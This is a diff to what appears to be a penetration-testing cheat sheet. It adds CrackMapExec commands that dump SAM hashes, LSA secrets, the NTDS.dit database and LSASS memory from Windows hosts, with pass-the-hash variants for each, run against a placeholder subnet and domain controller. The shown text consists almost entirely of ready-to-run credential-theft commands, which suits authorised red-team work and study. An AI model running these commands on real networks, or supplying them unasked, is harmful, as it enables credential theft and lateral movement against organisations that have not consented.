@@ -110,6 +110,15 @@ Sections below allow us to dump credentials from Kali linux to Windows target.
 
 ### CrackMapExec
 
+
+
+```bash
+# print all module
+crackmapexec smb -L
+```
+
+
+
 #### Mimikatz
 
 ```bash
@@ -120,12 +129,18 @@ crackmapexec smb <IP> -u USER -p PASSWORD -M mimikatz
 
 ```bash
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+
+# with PtH
+cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --sam
 ```
 
 #### Dump LSA <a href="#dump-lsa-secrets" id="dump-lsa-secrets"></a>
 
 ```bash
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+
+# with PtH
+cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --lsa
 ```
 
 #### Dump NTDS <a href="#dump-the-ntdsdit-from-target-dc" id="dump-the-ntdsdit-from-target-dc"></a>
@@ -133,6 +148,18 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```bash
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+
+# with PtH
+cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --ntds
+```
+
+#### Dump LSASS
+
+```bash
+cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --lsassy
+
+# with PtH
+cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' -M lsassy
 ```
 
 
